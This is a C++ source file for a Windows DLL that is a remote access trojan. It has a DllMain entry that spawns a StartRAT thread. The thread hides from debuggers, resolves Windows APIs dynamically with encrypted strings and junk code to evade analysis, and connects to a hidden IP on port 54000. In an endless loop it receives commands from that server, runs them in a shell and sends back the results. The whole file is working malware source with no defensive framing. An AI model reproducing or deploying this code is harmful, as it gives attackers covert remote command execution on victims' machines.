#include <iostream>
#include <string>
#include "TCPClient.h"
#include "utils.h"
#include "winapi_function_signatures.h"
#include "winapi_obfuscation.h"
#include "junk_codes.h"
#include "byte_encryption.h"

#define HideThreadFromDebugger 0x11

typedef NTSTATUS (NTAPI* NtSetInformationThread_t)(
	HANDLE					 ThreadHandle,
	DWORD					 ThreadInformationClass,
	PVOID					 ThreadInformation,
	ULONG					 ThreadInformationLength
	);


DWORD WINAPI StartRAT(LPVOID lpParam)
{

#ifndef _DEBUG
	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>(str_GetCurrentThread);
	resolve_dynamically<NtSetInformationThread_t>(str_NtSetInformationThread, str_ntdll)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
#endif

	suspicious_junk_3();

	TCPClient* conn = new TCPClient(&str_ip, 54000);
	conn->start_connection();

	while (true)
	{
		suspicious_junk_1();
		
		// recv command from server and execute it
		std::string result = exec(str_cmd, conn->recv_data());

		junk();

		// send result back to server
		conn->send_data(result);
	}

	delete conn;

	return 0;
}


BOOL WINAPI DllMain(HINSTANCE dllHandle, DWORD reason_for_call, LPVOID lpvReserved)
{
	switch (reason_for_call) {
	case DLL_PROCESS_ATTACH:
		// TODO: RESOLVE FUNCTION ADDRESSES DYNAMICALLY
		DisableThreadLibraryCalls(dllHandle);  // Avoid repeated DllMain calls for threads 
		CreateThread(nullptr, 0, StartRAT, nullptr, 0, nullptr); // Create a separate thread to run after DllMain, to avoid deadlocks
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
